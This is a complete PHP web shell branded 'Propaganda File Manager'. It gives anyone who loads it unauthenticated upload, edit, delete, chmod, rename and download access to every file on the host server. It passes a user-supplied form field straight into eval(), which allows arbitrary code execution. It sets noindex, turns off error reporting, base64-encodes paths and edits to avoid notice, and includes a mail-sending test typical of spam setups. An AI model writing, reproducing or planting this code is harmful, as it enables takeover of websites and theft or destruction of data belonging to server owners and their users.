<?php

error_reporting(0);
set_time_limit(0);
extract(iloveyou());

$_POST['path'] = (isset($_POST['path'])) ? propag($_POST['path'],'de') : false;
$_POST['name'] = (isset($_POST['name'])) ? propag($_POST['name'],'de') : false;

$hola = $_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];

if(isset($_GET['option']) && $_POST['opt'] == 'download'){
    header('Content-type: text/plain');
    header('Content-Disposition: attachment; filename="'.$_POST['name'].'"');
    echo(file_get_contents($_POST['path']));
    exit();
}

echo '<!DOCTYPE html>
<html>
<head>    
    <meta name="robots" content="noindex" />
    <link rel="stylesheet" href="//jok3r.org/css/font.css">
    <style>
        body{
            background-color: #e8fffe;
            text-shadow:0px 0px 1px #757575;
            margin: 0;
        }
        #container{
            width: 750px;
            margin: 20px auto;
            border: 1px solid black;
            padding: 10px;
            border-radius: 23px;
        }
        #header{
            text-align: center;
            background-color: #317981;
        	padding-bottom : 10px;
            border-top: 1px solid #000;
            border-bottom: 1px solid #000;
        }
        #header h1{
            margin: 0;
            font-family: \'Jok3r\'; 
            text-shadow: 2px 2px 5px #a3d6dc;
            padding-top : 5px;
        }
        #nav,#menu{
            padding-top: 5px;
            margin-left: 5px;
            padding-bottom: 5px;
            overflow: hidden;
        }
        #nav{
            margin-bottom: 10px;
        }
        #menu{
            text-align: center;
        }
        #content{
        margin: 0;
        padding: 5px;
        border-radius :15px;
        }
        
        #content table{
            width: 700px;
            margin: 0px;
        }
        #content table .first{
            text-align: center;
            background-color : #317981;
        }
        #content table .first:hover{
            background-color: #317981;
            text-shadow:0px 0px 1px #757575;
        }
        #content table tr:hover{
            background-color: #317981;
            text-shadow:0px 0px 10px #fff;
        } 
        .filename,a{
            color: #000;
            text-decoration: none;
            cursor: pointer;
        }
        .filename:hover,a:hover{
            color: white;
            text-shadow:0px 0px 10px #ffffff;
        }
        .center{
            text-align: center;
        }
        input,select,textarea{
            border: 1px #000000 solid;
            -moz-border-radius: 5px;
            -webkit-border-radius:5px;
            border-radius:5px;
        }
        .mb10{
        	margin-bottom: 10px;
        }
        .navlink{
            background-color : #44A8B3;
            text-align:center;
            padding: 10px;
            border-bottom : 1px solid #000;
        }
        #send{
            background-color: #44A8B3;
        }
        #send:hover{
            background-color: #317981;
            color: white;
            text-shadow:0px 0px 10px #ffffff;
        }
    </style>
    <script>
    function Encoder(data){
	var e =  document.getElementById(data);
	e.value = btoa(e.value);
	return true;
    }
    </script>
</head>
<body>
    <div id="header">
    <h1><a href="http://'.$hola.'">Propaganda File Manager</a></h1>
    </div>
    <div class="navlink mb10">
    <b>Current Path : '.nav_link().'</b>
    </div>
    <form method="post" >
    <center>Test Mail : <input type="text" name="email" placeholder="Test Email"value="'.$_POST['email'].'"required >
    <input type="submit" id="send" value="Send"></center>
    </form>';
    if (!empty($_POST['email'])){
    if(mail($_POST['email'],"Test PHP Mail Function","This is simple Test Email sent From Propganda","From: contact@".$_SERVER['SERVER_NAME'])){
      echo '<br><center><font color="green">Email has been sent successfully</font><br /></center>';
    }else{
      echo '<br><center><font color="red">Email sending failed</font><br /></center>';
    }
    }
    echo '
    <div id="container">
        <div id="nav">
            <div>
                <form class="mb10" enctype="multipart/form-data" method="POST" action="?path='.$propagpath.'&up">
                Upload File : <input type="file" name="file" />
                <input type="submit" value="upload" />
                </form>
            </div>
            <div>
                <form class="mb10" method="POST" action="?path='.$propagpath.'&new" onSubmit="Encoder(\'kc\')">
                <span>Create New : </span>
                <input name="name" type="text" size="13" id="kc" autocomplete="off"/>
                File <input type="radio" name="type" value="file" checked/>
                Dir <input type="radio" name="type" value="dir" />
                <input type="submit" value="Create" />
                </form>
            </div>
            <hr>
        <div id="content">';
        
        if(isset($_GET['filesrc'])){
            $file = propag($_GET['filesrc'],'de');
            echo '<div class="center">'.htmlspecialchars($file).'</div><textarea cols="101" rows="19">'.filesrc($file).'</textarea></pre>';
        }elseif(isset($_GET['option']) && $_POST['opt'] != 'delete' || (isset($_GET['new']) && $_POST['type'] == 'file')){

            echo '<div class="center">'.$_POST['name'].'<br />';
            
            if($_POST['opt'] == 'chmod'){
                if(isset($_POST['perm'])){
    
                    eval('$perm = '.$_POST['perm'].';');
                    if(chmod($_POST['path'],$perm)){
                        echo '<font color="green">Change Permission Done.</font><br />';
                        $permdone = true;
                    }else{
                        echo '<font color="red">Change Permission Error.</font><br />';
                    }
                }
                if($permdone){
                    $perm = $_POST['perm'];
                }else{
                    $perm = substr(sprintf('%o', fileperms($_POST['path'])), -4);
                }
                
                echo '<form method="POST">
                Permission : <input name="perm" type="text" size="4" value="'.$perm.'" />
                <input type="hidden" name="path" value="'.propag($_POST['path'],'en').'">
                <input type="hidden" name="name" value="'.propag($_POST['name'],'en').'">
                <input type="hidden" name="opt" value="chmod">
                <input type="submit" value="Go" />
                </form>';
            }elseif($_POST['opt'] == 'rename'){
                
                if(isset($_POST['newname'])){
                    if(rename($_POST['path'],$currentpath.'/'.$_POST['newname'])){
                        echo '<font color="green">Change Name Done.</font><br />';
                        $_POST['name'] = $_POST['newname'];
                    }else{
                        echo '<font color="red">Change Name Error.</font><br />';
                    }
                }
                
                echo '<form method="POST">
                New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
                <input type="hidden" name="path" value="'.propag($_POST['path'],'en').'">
                <input type="hidden" name="name" value="'.propag($_POST['name'],'en').'">
                <input type="hidden" name="opt" value="rename">
                <input type="submit" value="Go" />
                </form>';
            }elseif($_POST['opt'] == 'edit' || isset($_GET['new'])){
                if(isset($_POST['src'])){
                    $fp = fopen($_POST['path'],'w');
                    if(fwrite($fp,base64_decode($_POST['src']))){
                        echo '<font color="green">Edit File Done.</font><br />';
                        $done = true;
                    }else{
                        echo '<font color="red">Edit File Error.</font><br />';
                    }
                    fclose($fp);
                }
                if(isset($_GET['new']) && !$done){
                    $filecontent = '';
                    $_POST['path'] = "$currentpath/$_POST[name]";
                }else{
                    $filecontent = filesrc($_POST['path']);
                }
                echo '<form method="POST" onSubmit="Encoder(\'cc\')">
                <textarea cols="100" rows="19" name="src" id="cc">'.$filecontent.'</textarea><br />
                <input type="hidden" name="path" value="'.propag($_POST['path'],'en').'">
                <input type="hidden" name="name" value="'.propag($_POST['name'],'en').'">
                <input type="hidden" name="type" value="file" />
                <input type="hidden" name="opt" value="edit">
                <input type="submit" value="Save" />
                </form>';
            }
            
            echo '</div>';
        }else{
            echo '<div class="center">';
            if($_POST['opt'] == 'delete'){
                if($_POST['type'] == 'dir'){
                    if(deleteDir($_POST['path'])){
                        echo '<font color="green">Delete Dir Done.</font><br />';
                    }else{
                        echo '<font color="red">Delete Dir Error.</font><br />';
                    }
                }elseif($_POST['type'] == 'file'){
                    if(unlink($_POST['path'])){
                        echo '<font color="green">Delete File Done.</font><br />';
                    }else{
                        echo '<font color="red">Delete File Error.</font><br />';
                    }
                }
            }elseif($_POST['type'] == 'dir' && isset($_GET['new'])){
                if(mkdir("$currentpath/$_POST[name]")){
                    echo '<font color="green">Create Dir Done.</font><br />';
                }else{
                    echo '<font color="red">Create Dir Error.</font><br />';
                }
            }elseif(isset($_FILES['file'])){
                $userfile_name = $currentpath.'/'.$_FILES['file']['name'];
                $userfile_tmp = $_FILES['file']['tmp_name'];
                if(move_uploaded_file($userfile_tmp,$userfile_name)){
                    echo '<font color="green">File Upload Done.</font><br />';
                }else{
                    echo '<font color="red">File Upload Error.</font><br />';
                }
            }
            echo '</div><table>
                <tr class="first">
                    <td>Name</td>
                    <td>Size</td>
                    <td>Permissions</td>
                    <td>Options</td>
                </tr>';
        
        $dirs = getfiles('dir');
        foreach($dirs as $dir){
        echo '<div id="dirs"><tr>
        <td><a href="?path='.$dir['link'].'"><div class="filename">'.$dir['name'].'</div></a></td>
        <td class="center">'.$dir['size'].'</td>
        <td class="center"><font color="'.$dir['permcolor'].'">'.$dir['perm'].'</font></td>
        <td class="center"><form method="POST" action="?path='.$propagpath.'&option">
        <select name="opt">
	    <option value=""></option>
        <option value="delete">Delete</option>
        <option value="chmod">Chmod</option>
        <option value="rename">Rename</option>
        </select>
        <input type="hidden" name="type" value="dir">
        <input type="hidden" name="name" value="'.propag($dir['name'],'en').'">
        <input type="hidden" name="path" value="'.$dir['link'].'">
        <input type="submit" value=">" />
        </form></td>
        </tr>
        </div>';
        }
        echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
        
        $files = getfiles('file');
        foreach($files as $file){
            echo '<div id="files">
        
        <tr>
        <td><a href="?path='.$propagpath.'&filesrc='.$file['link'].'"><div class="filename">'.$file['name'].'</div></a></td>
        <td class="center">'.$file['size'].'</td>
        <td class="center"><font color="'.$file['permcolor'].'">'.$file['perm'].'</font></td>
        <td class="center"><form method="POST" action="?path='.$propagpath.'&option">
        <select name="opt">
	    <option value=""></option>
        <option value="delete">Delete</option>
        <option value="chmod">Chmod</option>
        <option value="rename">Rename</option>
        <option value="edit">Edit</option>
        <option value="download">Download</option>
        </select>
        <input type="hidden" name="type" value="file">
        <input type="hidden" name="name" value="'.propag($file['name'],'en').'">
        <input type="hidden" name="path" value="'.$file['link'].'">
        <input type="submit" value=">" />
        </form></td>
        </tr></div>';
        }
            echo '</table>';
        }
        echo '</div></div><hr><center><b>Coded By Orion</b></center></div>
</body>
</html>';

function getfiles($type){
    global $currentpath;
    $dir = scandir($currentpath);
    $result = array();
    foreach($dir as $file){
        $current['fullname'] = "$currentpath/$file";
        if($type == 'dir'){
            if(!is_dir($current['fullname']) || $file == '.' || $file == '..') continue;
        }elseif($type == 'file'){
            if(!is_file($current['fullname'])) continue;
        }
        
        $current['name'] = $file;
        $current['link'] = propag($current['fullname'],'en');
        $current['size'] = (is_dir($current['fullname'])) ? '--' : file_size($current['fullname']);
        $current['perm'] = perms($current['fullname']);
        if(is_writable($current['fullname'])){
            $current['permcolor'] = 'green';
        }elseif(is_readable($current['fullname'])){
            $current['permcolor'] = '';
        }else{
            $current['permcolor'] = 'red';
        }
        
        $result[] = $current;
        
    }
    return $result;
}
function iloveyou(){
    global $_POST,$_GET;
    
    $result['currentpath'] = (isset($_GET['path'])) ? propag($_GET['path'],'de') : cwd();
    $result['propagpath'] = (isset($_GET['path'])) ? $_GET['path'] : propag(cwd(),'en');
    
    return $result;
}
function file_size($file){
    $size = filesize($file)/1024;
    $size = round($size,3);
    if($size >= 1024){
        $size = round($size/1024,2).' MB';
    }else{
        $size = $size.' KB';
    }
    return $size;
}
function propag($txt,$type){
    if(function_exists('base64_encode') && function_exists('base64_decode')){
        return ($type == 'en') ? base64_encode($txt) : base64_decode($txt);
    }elseif(function_exists('strlen') && function_exists('dechex') && function_exists('ord') && function_exists('chr') && function_exists('hexdec')){
        return ($type == 'en') ? strToHex($txt) : hexToStr($txt);
    }else{
        $ar1 = array('public_html','.htaccess','/','.');
        $ar2 = array('bbbpuborionbbb','bbbhtaorionbbb','bbbsorionbbb','bbbdotorionbbb');
        return ($type == 'en') ? str_replace($ar1,$ar2,$txt) : str_replace($ar2,$ar1,$txt);
    }
}
function deleteDir($path) {
    return is_file($path) ?
            @unlink($path) :
            array_map(__FUNCTION__, glob($path.'/*')) == @rmdir($path);
}

function strToHex($string){
    $hex='';
    for ($i=0; $i < strlen($string); $i++)
    {
        $hex .= dechex(ord($string[$i]));
    }
    return $hex;
}
function hexToStr($hex){
    $string='';
    for ($i=0; $i < strlen($hex)-1; $i+=2)
    {
        $string .= chr(hexdec($hex[$i].$hex[$i+1]));
    }
    return $string;
}
function nav_link(){
    global $currentpath;
    $path = $currentpath;
    $path = str_replace('\\','/',$path);
    $paths = explode('/',$path);
    $result = '';
    foreach($paths as $id=>$pat){
        if($pat == '' && $id == 0){
            $a = true;
            $result .= '<a href="?path='.propag("/",'en').'">/</a>';
            continue;
        }
        if($pat == '') continue;
        $result .= '<a href="?path=';
        $linkpath = '';
        for($i=0;$i<=$id;$i++){
            $linkpath .= "$paths[$i]";
            if($i != $id) $linkpath .= "/";
        }
        $result .= propag($linkpath,'en');
        $result .=  '">'.$pat.'</a>/';
    }
    return $result;
}
function filesrc($file){
    return htmlspecialchars(file_get_contents($file));
}
function cwd(){
    if(function_exists('getcwd')){
        return getcwd();
    }else{
        $e = str_replace("\\","/",$path);
        $e = explode('/',$path);
        $result = '';
        for($i=0;$i<count($e)-1;$i++){
            if($e[$i] == '') continue;
            $result .= '/'.$e[$i];
        }
        return $result;
    }
}
function ex($a,$b,$text){
    $explode = explode($a,$text);
    $explode = explode($b,$explode[1]);
    return trim($explode[0]);
}
function perms($file){
    $perms = @fileperms($file);
if (($perms & 0xC000) == 0xC000) {
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    $info = 'p';
} else {
    $info = 'u';
}
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
          (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
?>